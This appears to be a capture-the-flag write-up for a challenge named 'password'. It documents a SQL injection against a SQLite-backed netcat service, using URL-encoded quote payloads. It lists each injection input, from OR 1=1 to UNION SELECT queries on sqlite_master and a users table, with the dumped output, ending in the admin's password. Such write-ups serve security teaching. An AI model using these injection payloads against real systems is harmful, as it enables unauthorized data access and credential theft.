Challenge: password
Target: nc 10.0.118.48 30366

Vulnerability:
- SQL injection in password input for a backend SQLite query.
- Input is interpolated into SQL without proper parameterization.
- URL-encoded quote (`%27`) bypasses simple filtering and enables SQL syntax control.

What hinted this path:
1. Prompt wording: "tweaking your input to bend the query".
2. Service accepted wildcard-like `%25` and returned DB tuples.
3. Quote-based payloads with `%27` produced full table dumps.

Exact observed interaction (input -> observed output):
1. Input: `test`
   Observed:
   - `Hmm, that didn’t quite work. Maybe try tweaking your input to bend the query a bit?`

2. Input: `%25`
   Observed:
   - `Nice one! You cracked the code! See what you found:`
   - `(1, '"Acid Burn"', '"52c3d9f4b1e8a2b0c5f6d7e8f9a0b1c2d3e4f5g6h7"')`

3. Input: `%27 OR 1=1 --`
   Observed:
   - `Nice one! You cracked the code! See what you found:`
   - Full row dump including:
     - `(4, '"admin"', '"e4syp4asy1234"')`

4. Input: `%27 UNION SELECT name,sql,3 FROM sqlite_master --`
   Observed:
   - `('usernames', 'CREATE TABLE usernames (id INTEGER PRIMARY KEY, username TEXT, password TEXT)', 3)`
   - This confirmed table name and columns.

5. Input: `%27 UNION SELECT id,username,password FROM usernames --`
   Observed:
   - Multiple user rows returned.
   - Admin row visible as:
     - `(4, '"admin"', '"e4syp4asy1234"')`

6. Input: `%27 UNION SELECT 1,password,3 FROM usernames WHERE id=4 --`
   Observed:
   - `(1, '"e4syp4asy1234"', 3)`
   - Extracted password value: `e4syp4asy1234`
